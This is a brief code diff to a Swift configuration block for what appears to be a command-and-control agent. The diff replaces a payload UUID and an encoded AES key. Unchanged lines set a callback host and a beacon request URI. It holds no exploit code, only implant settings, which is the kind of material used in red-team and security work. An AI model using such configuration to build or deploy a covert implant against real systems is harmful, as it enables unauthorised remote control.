@@ -29,8 +29,8 @@ struct AgentConfig {
 }
 
 var agentConfig = AgentConfig(
-    payloadUUID: "11f29cc3-9929-4f45-85dd-cbeb3939e415",
-    encodedAESKey: "44IH4uVvY6F1kHH07ixVTlwUGZuC40HuGnj3fnbLAuc=",
+    payloadUUID: "4c601578-9123-4db3-bf76-281b4c361a6c",
+    encodedAESKey: "XXjENt7hXJWlAh7grhstMle5XeK7b2C3uvBXXwF3hlM=",
 
     callbackHost: "192.168.196.3",
     getRequestURI: "/index",
